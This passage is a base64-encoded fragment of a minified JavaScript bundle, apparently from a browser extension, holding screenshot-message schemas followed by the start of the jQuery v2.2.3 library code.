vcGVydGllczp7ZHVyYXRpb246e3R5cGU6ImludGVnZXIiLGd0OjB9LGFjdGl2aXR5Ont0eXBlOiJvYmplY3QiLHN0cmljdDohMCxvcHRpb25hbDohMCxwcm9wZXJ0aWVzOntxdWFsaXR5Ont0eXBlOiJudW1iZXIiLGd0ZTowLGx0ZToxfSxtYXhfd2lkdGg6e3R5cGU6ImludGVnZXIiLGd0OjB9LG1heF9oZWlnaHQ6e3R5cGU6ImludGVnZXIiLGd0OjB9fX0sYnVmZmVyOnt0eXBlOiJvYmplY3QiLHN0cmljdDohMCxvcHRpb25hbDohMCxwcm9wZXJ0aWVzOntxdWFsaXR5Ont0eXBlOiJudW1iZXIiLGd0ZTowLGx0ZToxfSxtYXhfd2lkdGg6e3R5cGU6ImludGVnZXIiLGd0OjB9LG1heF9oZWlnaHQ6e3R5cGU6ImludGVnZXIiLGd0OjB9fX19fX0sInNjcmVlbnNob3Quc3RvcF9yZWNvcmRpbmciOnt9LCJzY3JlZW5zaG90LmdldCI6e3NjaGVtYTp7dHlwZToib2JqZWN0IixzdHJpY3Q6ITAscHJvcGVydGllczp7cXVhbGl0eTp7dHlwZToibnVtYmVyIixndGU6MCxsdGU6MX0sbWF4X3dpZHRoOntvcHRpb25hbDohMCx0eXBlOiJpbnRlZ2VyIixndDowfSxtYXhfaGVpZ2h0OntvcHRpb25hbDohMCx0eXBlOiJpbnRlZ2VyIixndDowfX19fSwic2NyZWVuc2hvdC5nZXRfYnVmZmVyIjp7c2NoZW1hOnt0eXBlOiJvYmplY3QiLHN0cmljdDohMCxzb21lS2V5czpbInVybCIsImRvbWFpbiJdLGV4ZWM6ZnVuY3Rpb24oZSx0KXsidXJsImluIHQmJiJkb21haW4iaW4gdCYmdGhpcy5yZXBvcnQoJ2NhblwndCBoYXZlIGJvdGggInVybCIgYW5kICJkb21haW4iIGtleXMnKX0scHJvcGVydGllczp7dXJsOnt0eXBlOiJzdHJpbmciLG9wdGlvbmFsOiEwfSxkb21haW46e3R5cGU6InN0cmluZyIsb3B0aW9uYWw6ITB9fX19fTtlLmV4cG9ydHM9e21lc3NhZ2VfbWV0YWRhdGE6cn19LGZ1bmN0aW9uKGUsdCxuKXt2YXIgcixpOw0KLyogYXBwIG5ldHdvcmtpbmcgJiBsb2dnaW5nICh3aGljaCB3ZSBtYXkgd2FudCB0byB0dXJuIG9mZikgLS0+ICovDQoNCi8qIDwhLS0galF1ZXJ5IHYyLjIuMyAqLw0KIWZ1bmN0aW9uKHQsbil7Im9iamVjdCI9PXR5cGVvZiBlJiYib2JqZWN0Ij09dHlwZW9mIGUuZXhwb3J0cz9lLmV4cG9ydHM9dC5kb2N1bWVudD9uKHQsITApOmZ1bmN0aW9uKGUpe2lmKCFlLmRvY3VtZW50KXRocm93IG5ldyBFcnJvcigialF1ZXJ5IHJlcXVpcmVzIGEgd2luZG93IHdpdGggYSBkb2N1bWVudCIpO3JldHVybiBuKGUpfTpuKHQpfSgidW5kZWZpbmVkIiE9dHlwZW9mIHdpbmRvdz93aW5kb3c6dGhpcyxmdW5jdGlvbihuLHMpe2Z1bmN0aW9uIG8oZSl7dmFyIHQ9ISFlJiYibGVuZ3RoImluIGUmJmUubGVuZ3RoLG49Y2UudHlwZShlKTtyZXR1cm4iZnVuY3Rpb24iPT09bnx8Y2UuaXNXaW5kb3coZSk/ITE6ImFycmF5Ij09PW58fDA9PT10fHwibnVtYmVyIj09dHlwZW9mIHQmJnQ+MCYmdC0xIGluIGV9ZnVuY3Rpb24gYShlLHQsbil7aWYoY2UuaXNGdW5jdGlvbih0KSlyZXR1cm4gY2UuZ3JlcChlLGZ1bmN0aW9uKGUscil7cmV0dXJuISF0LmNhbGwoZSxyLGUpIT09bn0pO2lmKHQubm9kZVR5cGUpcmV0dXJuIGNlLmdyZXAoZSxmdW5jdGlvbihlKXtyZXR1cm4gZT09PXQhPT1ufSk7aWYoInN0cmluZyI9PXR5cGVvZiB0KXtpZih2ZS50ZXN0KHQpKXJldHVybiBjZS5maWx0ZXIodCxlLG4pO3Q9Y2UuZmlsdGVyKHQsZSl9cmV0dXJuIGNlLmdyZXAoZSxmdW5jdGlvbihlKXtyZXR1cm4gcmUuY2FsbCh0LGUpPi0xIT09bn0pfWZ1bmN0aW9uIHUoZSx0KXtmb3IoOyhlPWVbdF0pJiYxIT09ZS5ub2RlVHlwZTspO3JldHVybiBlfWZ1bmN0aW9uIGMoZSl7dmFyIHQ9e307cmV0dXJuIGNlLmVhY2goZS5tYXRjaChUZSl8fFtdLGZ1bmN0aW9uKGUsbil7dFtuXT0hMH0pLHR9ZnVuY3Rpb24gbCgpe1oucmVtb3ZlRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsbCksbi5yZW1vdmVFdmVudExpc3RlbmVyKCJsb2FkIixsKSxjZS5yZWFkeSgpfWZ1bmN0aW9uIGQoKXt0aGlzLmV4cGFuZG89Y2UuZXhwYW5kbytkLnVpZCsrfWZ1bmN0aW9uIGgoZSx0LG4pe3ZhciByO2lmKHZvaWQgMD09PW4mJjE9PT1lLm5vZGVUeXBlKWlmKHI9ImRhdGEtIit0LnJlcGxhY2UoUGUsIi0kJiIpLnRvTG93ZXJDYXNlKCksbj1lLmdldEF0dHJpYnV0ZShyKSwic3RyaW5nIj09dHlwZW9mIG4pe3RyeXtuPSJ0cnVlIj09PW4/ITA6ImZhbHNlIj09PW4/ITE6Im51bGwiPT09bj9udWxsOituKyIiPT09bj8rbjpIZS50ZXN0KG4pP2NlLnBhcnNlSlNPTihuKTpufWNhdGNoKGkpe31qZS5zZXQoZSx0LG4pfWVsc2Ugbj12b2lkIDA7cmV0dXJuIG59ZnVuY3Rpb24gZihlLHQsbixyKXt2YXIgaSxzPTEsbz0yMCxhPXI/ZnVuY3Rpb24oKXtyZXR1cm4gci5jdXIoKX06ZnVuY3Rpb24oKXtyZXR1cm4gY2UuY3NzKGUsdCwiIil9LHU9YSgpLGM9biYmblszXXx8KGNlLmNzc051bWJlclt0XT8iIjoicHgiKSxsPShjZS5jc3NOdW1iZXJbdF18fCJweCIhPT1jJiYrdSkmJkZlLmV4ZWMoY2UuY3NzKGUsdCkpO2lmKGwmJmxbM10hPT1jKXtjPWN8fGxbM10sbj1ufHxbXSxsPSt1fHwxO2RvIHM9c3x8Ii41IixsLz1zLGNlLnN0eWxlKGUsdCxsK2MpO3doaWxlKHMhPT0ocz1hKCkvdSkmJjEhPT1zJiYtLW8pfXJldHVybiBuJiYobD0rbHx8K3V8fDAsaT1uWzFdP2wrKG5bMV0rMSkqblsyXTorblsyXSxyJiYoci51bml0PWMsci5zdGFydD1sLHIuZW5kPWkpKSxpfWZ1bmN0aW9uIHAoZSx0KXt2YXIgbj0idW5kZWZpbmVkIiE9dHlwZW9mIGUuZ2V0RWxlbWVudHNCeVRhZ05hbWU/ZS5nZXRFbGVtZW50c0J5VGFnTmFtZSh0fHwiKiIpOiJ1bmRlZmluZWQiIT10eXBlb2YgZS5xdWVyeVNlbGVjdG9yQWxsP2UucXVlcnlTZWxlY3RvckFsbCh0fHwiKiIpOltdO3JldHVybiB2b2lkIDA9PT10fHx0JiZjZS5ub2RlTmFtZShlLHQpP2NlLm1lcmdlKFtlXSxuKTpufWZ1bmN0aW9uIF8oZSx0KXtmb3IodmFyIG49MCxyPWUubGVuZ3RoO3I+bjtuKyspeGUuc2V0KGVbbl0sImdsb2JhbEV2YWwiLCF0fHx4ZS5nZXQodFtuXSwiZ2xvYmFsRXZhbCIpKX1mdW5jdGlvbiBtKGUsdCxuLHIsaSl7Zm9yKHZhciBzLG8sYSx1LGMsbCxkPXQuY3JlYXRlRG9jdW1lbnRGcmFnbWVudCgpLGg9W10sZj0wLG09ZS5sZW5ndGg7bT5mO2YrKylpZihzPWVbZl0sc3x8MD09PXMpaWYoIm9iamVjdCI9PT1jZS50eXBlKHMpKWNlLm1lcmdlKGgscy5ub2RlVHlwZT9bc106cyk7ZWxzZSBpZihXZS50ZXN0KHMpKXtmb3Iobz1vfHxkLmFwcGVuZENoaWxkKHQuY3JlYXRlRWxlbWVudCgiZGl2IikpLGE9KFJlLmV4ZWMocyl8fFsiIiwiIl0pWzFdLnRvTG93ZXJDYXNlKCksdT1JZVthXXx8SWUuX2RlZmF1bHQsby5pbm5lckhUTUw9dVsxXStjZS5odG1sUHJlZmlsdGVyKHMpK3VbMl0sbD11WzBdO2wtLTspbz1vLmxhc3RDaGlsZDtjZS5tZXJnZShoLG8uY2hpbGROb2Rlcyksbz1kLmZpcnN0Q2hpbGQsby50ZXh0Q29udGVudD0iIn1lbHNlIGgucHVzaCh0LmNyZWF0ZVRleHROb2RlKHMpKTtmb3IoZC50ZXh0Q29udGVudD0iIixmPTA7cz1oW2YrK107KWlmKHImJmNlLmluQXJyYXkocyxyKT4tMSlpJiZpLnB1c2gocyk7ZWxzZSBpZihjPWNlLmNvbnRhaW5zKHMub3duZXJEb2N1bWVudCxzKSxvPXAoZC5hcHBlbmRDaGlsZChzKSwic2NyaXB0IiksYyYmXyhvKSxuKWZvcihsPTA7cz1vW2wrK107KU5lLnRlc3Qocy50eXBlfHwiIikmJm4ucHVzaChzKTtyZXR1cm4gZH1mdW5jdGlvbiB5KCl7cmV0dXJuITB9ZnVuY3Rpb24gZygpe3JldHVybiExfWZ1bmN0aW9uIHYoKXt0cnl7cmV0dXJuIFouYWN0aXZlRWxlbWVudH1jYXRjaChlKXt9fWZ1bmN0aW9uIGIoZSx0LG4scixpLHMpe3ZhciBvLGE7aWYoIm9iamVjdCI9PXR5cGVvZiB0KXsic3RyaW5nIiE9dHlwZW9mIG4mJihyPXJ8fG4sbj12b2lkIDApO2ZvcihhIGluIHQpYihlLGEsbixyLHRbYV0scyk7cmV0dXJuIGV9aWYobnVsbD09ciYmbnVsbD09aT8oaT1uLHI9bj12b2lkIDApOm51bGw9PWkmJigic3RyaW5nIj09dHlwZW9mIG4/KGk9cixyPXZvaWQgMCk6KGk9cixyPW4sbj12b2lkIDApKSxpPT09ITEpaT1nO2Vsc2UgaWYoIWkpcmV0dXJuIGU7cmV0dXJuIDE9PT1zJiYobz1pLGk9ZnVuY3Rpb24oZSl7cmV0dXJuIGNlKCkub2ZmKGUpLG8uYXBwbHkodGhpcyxhcmd1bWVudHMpfSxpLmd1aWQ9by5ndWlkfHwoby5ndWlkPWNlLmd1aWQrKykpLGUuZWFjaChmdW5jdGlvbigpe2NlLmV2ZW50LmFkZCh0aGlzLHQsaSxyLG4pfSl9ZnVuY3Rpb24gTShlLHQpe3JldHVybiBjZS5ub2RlTmFtZShlLCJ0YWJsZSIpJiZjZS5ub2RlTmFtZSgxMSE9PXQubm9kZVR5cGU/dDp0LmZpcnN0Q2hpbGQsInRyIik/ZS5nZXRFbGVtZW50c0J5VGFnTmFtZSgidGJvZHkiKVswXXx8ZS5hcHBlbmRDaGlsZChlLm93bmVyRG9jdW1lbnQuY3JlYXRlRWxlbWVudCgidGJvZHkiKSk6ZX1mdW5jdGlvbiBMKGUpe3JldHVybiBlLnR5cGU9KG51bGwhPT1lLmdldEF0dHJpYnV0ZSgidHlwZSIpKSsiLyIrZS50eXBlLGV9ZnVuY3Rpb24gayhlKXt2YXIgdD1WZS5leGVjKGUudHlwZSk7cmV0dXJuIHQ/ZS50eXBlPXRbMV06ZS5yZW1vdmVBdHRyaWJ1dGUoInR5cGUiKSxlfWZ1bmN0aW9uIHcoZSx0KXt2YXIgbixyLGkscyxvLGEsdSxjO2lmKDE9PT10Lm5vZGVUeXBlKXtpZih4ZS5oYXNEYXRhKGUpJiYocz14ZS5hY2Nlc3MoZSksbz14ZS5zZXQodCxzKSxjPXMuZXZlbnRzKSl7ZGVsZXRlIG8uaGFuZGxlLG8uZXZlbnRzPXt9O2ZvcihpIGluIGMpZm9yKG49MCxyPWNbaV0ubGVuZ3RoO3I+bjtuKyspY2UuZXZlbnQuYWRkKHQsaSxjW2ldW25dKX1qZS5oYXNEYXRhKGUpJiYoYT1qZS5hY2Nlc3MoZSksdT1jZS5leHRlbmQoe30sYSksamUuc2V0KHQsdSkpfX1mdW5jdGlvbiBUKGUsdCl7dmFyIG49dC5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpOyJpbnB1dCI9PT1uJiZPZS50ZXN0KGUudHlwZSk/dC5jaGVja2VkPWUuY2hlY2tlZDoiaW5wdXQiIT09biYmInRleHRhcmVhIiE9PW58fCh0LmRlZmF1bHRWYWx1ZT1lLmRlZmF1bHRWYWx1ZSl9ZnVuY3Rpb24gWShlLHQsbixyKXt0PXRlLmFwcGx5KFtdLHQpO3ZhciBpLHMsbyxhLHUsYyxsPTAsZD1lLmxlbmd0aCxoPWQtMSxmPXRbMF0sXz1jZS5pc0Z1bmN0aW9uKGYpO2lmKF98fGQ+MSYmInN0cmluZyI9PXR5cGVvZiBmJiYhYWUuY2hlY2tDbG9uZSYmQmUudGVzdChmKSlyZXR1cm4gZS5lYWNoKGZ1bmN0aW9uKGkpe3ZhciBzPWUuZXEoaSk7XyYmKHRbMF09Zi5jYWxsKHRoaXMsaSxzLmh0bWwoKSkpLFkocyx0LG4scil9KTtpZihkJiYoaT1tKHQsZVswXS5vd25lckRvY3VtZW50LCExLGUscikscz1pLmZpcnN0Q2hpbGQsMT09PWkuY2hpbGROb2Rlcy5sZW5ndGgmJihpPXMpLHN8fHIpKXtmb3Iobz1jZS5tYXAocChpLCJzY3JpcHQiKSxMKSxhPW8ubGVuZ3RoO2Q+bDtsKyspdT1pLGwhPT1oJiYodT1jZS5jbG9uZSh1LCEwLCEwKSxhJiZjZS5tZXJnZShvLHAodSwic2NyaXB0IikpKSxuLmNhbGwoZVtsXSx1LGwpO2lmKGEpZm9yKGM9b1tvLmxlbmd0aC0xXS5vd25lckRvY3VtZW50LGNlLm1hcChvLGspLGw9MDthPmw7bCsrKXU9b1tsXSxOZS50ZXN0KHUudHlwZXx8IiIpJiYheGUuYWNjZXNzKHUsImdsb2JhbEV2YWwiKSYmY2UuY29udGFpbnMoYyx1KSYmKHUuc3JjP2NlLl9ldmFsVXJsJiZjZS5fZXZhbFVybCh1LnNyYyk6Y2UuZ2xvYmFsRXZhbCh1LnRleHRDb250ZW50LnJlcGxhY2UoR2UsIiIpKSl9cmV0dXJuIGV9ZnVuY3Rpb24gRChlLHQsbil7Zm9yKHZhciByLGk9dD9jZS5maWx0ZXIodCxlKTplLHM9MDtudWxsIT0ocj1pW3NdKTtzKyspbnx8MSE9PXIubm9kZVR5cGV8fGNlLmNsZWFuRGF0YShwKHIpKSxyLnBhcmVudE5vZGUmJihuJiZjZS5jb250YWlucyhyLm93bmVyRG9jdW1lbnQscikmJl8ocChyLCJzY3JpcHQiKSksci5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKHIpKTtyZXR1cm4gZX1mdW5jdGlvbiBTKGUsdCl7dmFyIG49Y2UodC5jcmVhdGVFbGVtZW50KGUpKS5hcHBlbmRUbyh0LmJvZHkpLHI9Y2UuY3NzKG5bMF0sImRpc3BsYXkiKTtyZXR1cm4gbi5kZXRhY2goKSxyfWZ1bmN0aW9uIHgoZSl7dmFyIHQ9WixuPVFlW2VdO3JldHVybiBufHwobj1TKGUsdCksIm5vbmUiIT09biYmbnx8KFhlPShYZXx8Y2UoIjxpZnJhbWUgZnJhbWVib3JkZXI9JzAnIHdpZHRoPScwJyBoZWlnaHQ9JzAnLz4iKSkuYXBwZW5kVG8odC5kb2N1bWVudEVsZW1lbnQpLHQ9WGVbMF0uY29udGVudERvY3VtZW50LHQud3JpdGUoKSx0LmNsb3NlKCksbj1TKGUsdCksWGUuZGV0YWNoKCkpLFFlW2VdPW4pLG59ZnVuY3Rpb24gaihlLHQsbil7dmFyIHIsaSxzLG8sYT1lLnN0eWxlO3JldHVybiBuPW58fGV0KGUpLG89bj9uLmdldFByb3BlcnR5VmFsdWUodCl8fG5bdF06dm9pZCAwLCIiIT09byYmdm9pZCAwIT09b3x8Y2UuY29udGFpbnMoZS5vd25lckRvY3VtZW50LGUpfHwobz1jZS5zdHlsZShlLHQpKSxuJiYhYWUucGl4ZWxNYXJnaW5SaWdodCgpJiZaZS50ZXN0KG8pJiZLZS50ZXN0KHQpJiYocj1hLndpZHRoLGk9YS5taW5XaWR0aCxzPWEubWF4V2lkdGgsYS5taW5XaWR0aD1hLm1heFdpZHRoPWEud2lkdGg9byxvPW4ud2lkdGgsYS53aWR0aD1yLGEubWluV2lkdGg9aSxhLm1heFdpZHRoPXMpLHZvaWQgMCE9PW8/bysiIjpvfWZ1bmN0aW9uIEgoZSx0KXtyZXR1cm57Z2V0OmZ1bmN0aW9uKCl7cmV0dXJuIGUoKT92b2lkIGRlbGV0ZSB0aGlzLmdldDoodGhpcy5nZXQ9dCkuYXBwbHkodGhpcyxhcmd1bWVudHMpfX19ZnVuY3Rpb24gUChlKXtpZihlIGluIGF0KXJldHVybiBlO2Zvcih2YXIgdD1lWzBdLnRvVXBwZXJDYXNlKCkrZS5zbGljZSgxKSxuPW90Lmxlbmd0aDtuLS07KWlmKGU9b3Rbbl0rdCxlIGluIGF0KXJldHVybiBlfWZ1bmN0aW9uIEUoZSx0LG4pe3ZhciByPUZlLmV4ZWModCk7cmV0dXJuIHI/TWF0aC5tYXgoMCxyWzJdLShufHwwKSkrKHJbM118fCJweCIpOnR9ZnVuY3Rpb24gRihlLHQsbixyLGkpe2Zvcih2YXIgcz1uPT09KHI/ImJvcmRlciI6ImNvbnRlbnQiKT80OiJ3aWR0aCI9PT10PzE6MCxvPTA7ND5zO3MrPTIpIm1hcmdpbiI9PT1uJiYobys9Y2UuY3NzKGUsbitDZVtzXSwhMCxpKSkscj8oImNvbnRlbnQiPT09biYmKG8tPWNlLmNzcyhlLCJwYWRkaW5nIitDZVtzXSwhMCxpKSksIm1hcmdpbiIhPT1uJiYoby09Y2UuY3NzKGUsImJvcmRlciIrQ2Vbc10rIldpZHRoIiwhMCxpKSkpOihvKz1jZS5jc3MoZSwicGFkZGluZyIrQ2Vbc10sITAsaSksInBhZGRpbmciIT09biYmKG8rPWNlLmNzcyhlLCJib3JkZXIiK0NlW3NdKyJXaWR0aCIsITAsaSkpKTtyZXR1cm4gb31mdW5jdGlvbiBDKGUsdCxyKXt2YXIgaT0hMCxzPSJ3aWR0aCI9PT10P2Uub2Zmc2V0V2lkdGg6ZS5vZmZzZXRIZWlnaHQsbz1ldChlKSxhPSJib3JkZXItYm94Ij09PWNlLmNzcyhlLCJib3hTaXppbmciLCExLG8pO2lmKFoubXNGdWxsc2NyZWVuRWxlbWVudCYmbi50b3AhPT1uJiZlLmdldENsaWVudFJlY3RzKCkubGVuZ3RoJiYocz1NYXRoLnJvdW5kKDEwMCplLmdldEJvdW5kaW5nQ2xpZW50UmVjdCgpW3RdKSksMD49c3x8bnVsbD09cyl7aWYocz1qKGUsdCxvKSwoMD5zfHxudWxsPT1zKSYmKHM9ZS5zdHlsZVt0XSksWmUudGVzdChzKSlyZXR1cm4gcztpPWEmJihhZS5ib3hTaXppbmdSZWxpYWJsZSgpfHxzPT09ZS5zdHlsZVt0XSkscz1wYXJzZUZsb2F0KHMpfHwwfXJldHVybiBzK0YoZSx0LHJ8fChhPyJib3JkZXIiOiJjb250ZW50IiksaSxvKSsicHgifWZ1bmN0aW9uIEEoZSx0KXtmb3IodmFyIG4scixpLHM9W10sbz0wLGE9ZS5sZW5ndGg7YT5vO28rKylyPWVbb10sci5zdHlsZSYmKHNbb109eGUuZ2V0KHIsIm9sZGRpc3BsYXkiKSxuPXIuc3R5bGUuZGlzcGxheSx0PyhzW29dfHwibm9uZSIhPT1ufHwoci5zdHlsZS5kaXNwbGF5PSIiKSwiIj09PXIuc3R5bGUuZGlzcGxheSYmQWUocikmJihzW29dPXhlLmFjY2VzcyhyLCJvbGRkaXNwbGF5Iix4KHIubm9kZU5hbWUpKSkpOihpPUFlKHIpLCJub25lIj09PW4mJml8fHhlLnNldChyLCJvbGRkaXNwbGF5IixpP246Y2UuY3NzKHIsImRpc3BsYXkiKSkpKTtmb3Iobz0wO2E+bztvKyspcj1lW29dLHIuc3R5bGUmJih0JiYibm9uZSIhPT1yLnN0eWxlLmRpc3BsYXkmJiIiIT09ci5zdHlsZS5kaXNwbGF5fHwoci5zdHlsZS5kaXNwbGF5PXQ/c1tvXXx8IiI6Im5vbmUiKSk7cmV0dXJuIGV9ZnVuY3Rpb24gTyhlLHQsbixyLGkpe3JldHVybiBuZXcgTy5wcm90b3R5cGUuaW5pdChlLHQsbixyLGkpfWZ1bmN0aW9uIFIoKXtyZXR1cm4gbi5zZXRUaW1lb3V0KGZ1bmN0aW9uKCl7dXQ9dm9pZCAwfSksdXQ9Y2Uubm93KCl9ZnVuY3Rpb24gTihlLHQpe3ZhciBuLHI9MCxpPXtoZWlnaHQ6ZX07Zm9yKHQ9dD8xOjA7ND5yO3IrPTItdCluPUNlW3JdLGlbIm1hcmdpbiIrbl09aVsicGFkZGluZyIrbl09ZTtyZXR1cm4gdCYmKGkub3BhY2l0eT1pLndpZHRoPWUpLGl9ZnVuY3Rpb24gSShlLHQsbil7Zm9yKHZhciByLGk9KHoudHdlZW5lcnNbdF18fFtdKS5jb25jYXQoei50d2VlbmVyc1siKiJdKSxzPTAsbz1pLmxlbmd0aDtvPnM7cysrKWlmKHI9aVtzXS5jYWxsKG4sdCxlKSlyZXR1cm4gcn1mdW5jdGlvbiBXKGUsdCxuKXt2YXIgcixpLHMsbyxhLHUsYyxsLGQ9dGhpcyxoPXt9LGY9ZS5zdHlsZSxwPWUubm9kZVR5cGUmJkFlKGUpLF89eGUuZ2V0KGUsImZ4c2hvdyIpO24ucXVldWV8fChhPWNlLl9xdWV1ZUhvb2tzKGUsImZ4IiksbnVsbD09YS51bnF1ZXVlZCYmKGEudW5xdWV1ZWQ9MCx1PWEuZW1wdHkuZmlyZSxhLmVtcHR5LmZpcmU9ZnVuY3Rpb24oKXthLnVucXVldWVkfHx1KCl9KSxhLnVucXVldWVkKyssZC5hbHdheXMoZnVuY3Rpb24oKXtkLmFsd2F5cyhmdW5jdGlvbigpe2EudW5xdWV1ZWQtLSxjZS5xdWV1ZShlLCJmeCIpLmxlbmd0aHx8YS5lbXB0eS5maXJlKCl9KX0pKSwxPT09ZS5ub2RlVHlwZSYmKCJoZWlnaHQiaW4gdHx8IndpZHRoImluIHQpJiYobi5vdmVyZmxvdz1bZi5vdmVyZmxvdyxmLm92ZXJmbG93WCxmLm92ZXJmbG93WV0sYz1jZS5jc3MoZSwiZGlzcGxheSIpLGw9Im5vbmUiPT09Yz94ZS5nZXQoZSwib2xkZGlzcGxheSIpfHx4KGUubm9kZU5hbWUpOmMsImlubGluZSI9PT1sJiYibm9uZSI9PT1jZS5jc3MoZSwiZmxvYXQiKSYmKGYuZGlzcGxheT0iaW5saW5lLWJsb2NrIikpLG4ub3ZlcmZsb3cmJihmLm92ZXJmbG93PSJoaWRkZW4iLGQuYWx3YXlzKGZ1bmN0aW9uKCl7Zi5vdmVyZmxvdz1uLm92ZXJmbG93WzBdLGYub3ZlcmZsb3dYPW4ub3ZlcmZsb3dbMV0sZi5vdmVyZmxvd1k9bi5vdmVyZmxvd1syXX0pKTtmb3IociBpbiB0KWlmKGk9dFtyXSxsdC5leGVjKGkpKXtpZihkZWxldGUgdFtyXSxzPXN8fCJ0b2dnbGUiPT09aSxpPT09KHA/ImhpZGUiOiJzaG93Iikpe2lmKCJzaG93IiE9PWl8fCFffHx2b2lkIDA9PT1fW3JdKWNvbnRpbnVlO3A9ITB9aFtyXT1fJiZfW3JdfHxjZS5zdHlsZShlLHIpfWVsc2UgYz12b2lkIDA7aWYoY2UuaXNFbXB0eU9iamVjdChoKSkiaW5saW5lIj09PSgibm9uZSI9PT1jP3goZS5ub2RlTmFtZSk6YykmJihmLmRpc3BsYXk9Yyk7ZWxzZXtfPyJoaWRkZW4iaW4gXyYmKHA9Xy5oaWRkZW4pOl89eGUuYWNjZXNzKGUsImZ4c2hvdyIse30pLHMmJihfLmhpZGRlbj0hcCkscD9jZShlKS5zaG93KCk6ZC5kb25lKGZ1bmN0aW9uKCl7Y2UoZSkuaGlkZSgpfSksZC5kb25lKGZ1bmN0aW9uKCl7dmFyIHQ7eGUucmVtb3ZlKGUsImZ4c2hvdyIpO2Zvcih0IGluIGgpY2Uuc3R5bGUoZSx0LGhbdF0pfSk7Zm9yKHIgaW4gaClvPUkocD9fW3JdOjAscixkKSxyIGluIF98fChfW3JdPW8uc3RhcnQscCYmKG8uZW5kPW8uc3RhcnQsby5zdGFydD0id2lkdGgiPT09cnx8ImhlaWdodCI9PT1yPzE6MCkpfX1mdW5jdGlvbiBVKGUsdCl7dmFyIG4scixpLHMsbztmb3IobiBpbiBlKWlmKHI9Y2UuY2FtZWxDYXNlKG4pLGk9dFtyXSxzPWVbbl0sY2UuaXNBcnJheShzKSYmKGk9c1sxXSxzPWVbbl09c1swXSksbiE9PXImJihlW3JdPXMsZGVsZXRlIGVbbl0pLG89Y2UuY3NzSG9va3Nbcl0sbyYmImV4cGFuZCJpbiBvKXtzPW8uZXhwYW5kKHMpLGRlbGV0ZSBlW3JdO2ZvcihuIGluIHMpbiBpbiBlfHwoZVtuXT1zW25dLHRbbl09aSl9ZWxzZSB0W3JdPWl9ZnVuY3Rpb24geihlLHQsbil7dmFyIHIsaSxzPTAsbz16LnByZWZpbHRlcnMubGVuZ3RoLGE9Y2UuRGVmZXJyZWQoKS5hbHdheXMoZnVuY3Rpb24oKXtkZWxldGUgdS5lbGVtfSksdT1mdW5jdGlvbigpe2lmKGkpcmV0dXJuITE7Zm9yKHZhciB0PXV0fHxSKCksbj1NYXRoLm1heCgwLGMuc3RhcnRUaW1lK2MuZHVyYXRpb24tdCkscj1uL2MuZHVyYXRpb258fDAscz0xLXIsbz0wLHU9Yy50d2VlbnMubGVuZ3RoO3U+bztvKyspYy50d2VlbnNbb10ucnVuKHMpO3JldHVybiBhLm5vdGlmeVdpdGgoZSxbYyxzLG5dKSwxPnMmJnU/bjooYS5yZXNvbHZlV2l0aChlLFtjXSksITEpfSxjPWEucHJvbWlzZSh7ZWxlbTplLHByb3BzOmNlLmV4dGVuZCh7fSx0KSxvcHRzOmNlLmV4dGVuZCghMCx7c3BlY2lhbEVhc2luZzp7fSxlYXNpbmc6Y2UuZWFzaW5nLl9kZWZhdWx0fSxuKSxvcmlnaW5hbFByb3BlcnRpZXM6dCxvcmlnaW5hbE9wdGlvbnM6bixzdGFydFRpbWU6dXR8fFIoKSxkdXJhdGlvbjpuLmR1cmF0aW9uLHR3ZWVuczpbXSxjcmVhdGVUd2VlbjpmdW5jdGlvbih0LG4pe3ZhciByPWNlLlR3ZWVuKGUsYy5vcHRzLHQsbixjLm9wdHMuc3BlY2lhbEVhc2luZ1t0XXx8Yy5vcHRzLmVhc2luZyk7cmV0dXJuIGMudHdlZW5zLnB1c2gocikscn0sc3RvcDpmdW5jdGlvbih0KXt2YXIgbj0wLHI9dD9jLnR3ZWVucy5sZW5ndGg6MDtpZihpKXJldHVybiB0aGlzO2ZvcihpPSEwO3I+bjtuKyspYy50d2VlbnNbbl0ucnVuKDEpO3JldHVybiB0PyhhLm5vdGlmeVdpdGgoZSxbYywxLDBdKSxhLnJlc29sdmVXaXRoKGUsW2MsdF0pKTphLnJlamVjdFdpdGgoZSxbYyx0XSksdGhpc319KSxsPWMucHJvcHM7Zm9yKFUobCxjLm9wdHMuc3BlY2lhbEVhc2luZyk7bz5zO3MrKylpZihyPXoucHJlZmlsdGVyc1tzXS5jYWxsKGMsZSxsLGMub3B0cykpcmV0dXJuIGNlLmlzRnVuY3Rpb24oci5zdG9wKSYmKGNlLl9xdWV1ZUhvb2tzKGMuZWxlbSxjLm9wdHMucXVldWUpLnN0b3A9Y2UucHJveHkoci5zdG9wLHIpKSxyO3JldHVybiBjZS5tYXAobCxJLGMpLGNlLmlzRnVuY3Rpb24oYy5vcHRzLnN0YXJ0KSYmYy5vcHRzLnN0YXJ0LmNhbGwoZSxjKSxjZS5meC50aW1lcihjZS5leHRlbmQodSx7ZWxlbTplLGFuaW06YyxxdWV1ZTpjLm9wdHMucXVldWV9KSksYy5wcm9ncmVzcyhjLm9wdHMucHJvZ3Jlc3MpLmRvbmUoYy5vcHRzLmRvbmUsYy5vcHRzLmNvbXBsZXRlKS5mYWlsKGMub3B0cy5mYWlsKS5hbHdheXMoYy5vcHRzLmFsd2F5cyl9ZnVuY3Rpb24gcShlKXtyZXR1cm4gZS5nZXRBdHRyaWJ1dGUmJmUuZ2V0QXR0cmlidXRlKCJjbGFzcyIpfHwiIn1mdW5jdGlvbiBKKGUpe3JldHVybiBmdW5jdGlvbih0LG4peyJzdHJpbmciIT10eXBlb2YgdCYmKG49dCx0PSIqIik7dmFyIHIsaT0wLHM9dC50b0xvd2VyQ2FzZSgpLm1hdGNoKFRlKXx8W107aWYoY2UuaXNGdW5jdGlvbihuKSlmb3IoO3I9c1tpKytdOykiKyI9PT1yWzBdPyhyPXIuc2xpY2UoMSl8fCIqIiwoZVtyXT1lW3JdfHxbXSkudW5zaGlmdChuKSk6KGVbcl09ZVtyXXx8W10pLnB1c2gobil9fWZ1bmN0aW9uICQoZSx0LG4scil7ZnVuY3Rpb24gaShhKXt2YXIgdTtyZXR1cm4gc1thXT0hMCxjZS5lYWNoKGVbYV18fFtdLGZ1bmN0aW9uKGUsYSl7dmFyIGM9YSh0LG4scik7cmV0dXJuInN0cmluZyIhPXR5cGVvZiBjfHxvfHxzW2NdP28/ISh1PWMpOnZvaWQgMDoodC5kYXRhVHlwZXMudW5zaGlmdChjKSxpKGMpLCExKX0pLHV9dmFyIHM9e30sbz1lPT09anQ7cmV0dXJuIGkodC5kYXRhVHlwZXNbMF0pfHwh